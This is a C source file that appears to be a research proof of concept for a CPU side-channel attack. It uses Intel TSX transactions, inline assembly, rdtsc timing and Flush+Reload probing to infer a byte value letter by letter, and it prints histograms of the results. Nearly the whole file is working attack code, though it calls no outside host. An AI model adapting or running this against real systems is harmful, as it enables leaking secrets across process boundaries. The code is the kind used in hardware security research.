#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include "cacheutils.h"

#define FROM 'A'
#define TO 'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
int hist[256];
int hist_timing[256];
uint64_t start_time, spend_time;
uint64_t max_time, min_time;
int max_i, max_i_index, mark, min_i, min_i_index;
unsigned char argmax, argmin;

int recover(void);

int main(int argc, char *argv[])
{
  if (!has_tsx())
  {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }

  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++)
  {
    flush(mem + i * 4096);
  }

  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);
  for (size_t i = 0; i < 256; i++)
  {
    hist_timing[i] = 0;
  }
  size_t count = 0;
  while (true)
  {
    max_time = 0, mark = 0;
    min_time = 0xffffffff;
    for (uint8_t test_num = 0; test_num <= TO; test_num++)
    {
      /* Flush mapping */
      // test_num = 6;
      start_time = rdtsc();
      // flush(&test_num);
      flush(mapping);
      flush(mapping);
      flush(mapping);

      /* Begin transaction and recover value */
      if (xbegin() == (~0u))
      {
        asm volatile(
            "mov %0, %%bl;"
            // timing side channel
            "sub %%bl, (%1);"
            "jz equal;"
            :
            : "r"(test_num), "r"(mapping)
            :);
        asm volatile(
            "equal: nop;");
        xend();
      }
      // mark = recover();

      spend_time = rdtsc() - start_time;
      if (max_time < spend_time)
      {
        max_time = spend_time, argmax = test_num;
      }
      if (min_time > spend_time)
      {
        min_time = spend_time, argmin = test_num;
      }
    }
    // printf("argmax: %3c, argmax_num: %d\n", (char)argmax, argmax);
    hist_timing[argmax]++;
    // hist_timing[argmin]++;
    count++;
    {
     if ((count % 10000) == 0)
      {
        printf("\x1b[2J");
        int max = 1, min = 0xfffffff;
        for (int i = FROM; i <= TO; i++)
        {
          if (hist_timing[i] > max)
          {
            max = hist_timing[i];
          }
          if (hist_timing[i] < min)
          {
            min = hist_timing[i];
          }
        }

        for (int i = FROM; i <= TO; i++)
        {
          printf("%c: (%4u) ", i, (unsigned int)hist_timing[i]);
          for (int j = 0; j < 60 - hist_timing[i] * 60 / max; j++)
          {
            printf("#");
          }
          printf("\n");
        }

        for (int i = FROM; i <= TO; i++)
        {
          hist_timing[i] -= min;
        }

        fflush(stdout);
      }
    }
  }

  return 0;
}

int recover(void)
{

  /* Recover value from cache and update histogram */
  bool update = false;
  for (size_t i = FROM; i <= TO; i++)
  {
    if (flush_reload((char *)mem + 4096 * i))
    {
      hist[i]++;
      update = true;
    }
  }

  /* Redraw histogram on update */
  if (update == true)
  {
#ifdef _WIN32
    system("cls");
#else
    printf("\x1b[2J");
#endif

    int max = 1;

    for (int i = FROM; i <= TO; i++)
    {
      if (hist[i] > max)
      {
        max = hist[i];
      }
    }

    for (int i = FROM; i <= TO; i++)
    {
      printf("%c: (%4u) ", i, (unsigned int)hist[i]);
      for (int j = 0; j < hist[i] * 60 / max; j++)
      {
        printf("#");
      }
      printf("\n");
    }

    fflush(stdout);
    return 1;
  }
  return 0;
}
